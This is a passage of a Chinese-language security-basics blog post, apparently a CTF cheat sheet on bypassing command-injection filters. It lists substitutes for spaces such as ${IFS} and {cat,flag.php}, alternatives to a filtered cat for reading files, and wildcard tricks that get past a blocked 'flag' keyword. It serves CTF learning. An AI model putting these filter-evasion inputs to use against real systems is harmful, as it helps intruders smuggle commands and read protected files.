-<h5 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h5><p>&lt; &lt;&gt; 重定向符<br>%09(需要php环境)<br>${IFS}<br>$IFS$9<br>{cat,flag.php} //用逗号实现了空格功能<br>%20<br>%09</p>
-<h5 id="读文件绕过-cat绕过"><a href="#读文件绕过-cat绕过" class="headerlink" title="读文件绕过(cat绕过)"></a>读文件绕过(cat绕过)</h5><p>适用条件:过滤了cat<br>1)more:一页一页的显示档案内容<br>(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页<br>(3)head:查看头几行<br>(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>(5)tail:查看尾几行<br>(6)nl：显示的时候，顺便输出行号<br>(7)od:以二进制的方式读取档案内容<br>(8)vi:一种编辑器，这个也可以查看<br>(9)vim:一种编辑器，这个也可以查看<br>(10)sort:可以查看<br>(11)uniq:可以查看<br>(12)file -f:报错出具体内容<br>grep grep test *file #在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</p>
-<h5 id="linux通配符绕过"><a href="#linux通配符绕过" class="headerlink" title="linux通配符绕过"></a>linux通配符绕过</h5><p>适用条件:过滤了flag，没有过滤 ? *<br>在linux系统中 有一些通配符</p>
-<p>匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个） ls file *<br>? 匹配任何一个字符（不在括号内时）?代表任意1个字符 ls file 0<br>[abcd] 匹配abcd中任何一个字符<br>[a-z] 表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符 ls file 0</p>
 ]]></content>
       <categories>
         <category>网安基础篇</category>
